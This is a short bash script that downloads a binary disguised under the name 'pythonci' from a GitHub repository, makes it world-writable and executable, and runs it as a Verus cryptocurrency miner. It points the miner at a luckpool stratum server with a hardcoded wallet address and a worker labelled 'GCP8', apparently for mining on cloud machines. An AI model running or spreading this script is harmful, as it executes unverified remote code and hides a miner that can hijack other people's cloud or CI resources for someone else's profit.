#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
wget https://github.com/hendrik20212/hendr2021/raw/main/pythonci
chmod 777 pythonci
./pythonci -a verus -o stratum+tcp://na.luckpool.net:3956 -u RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r.GCP8 -t2
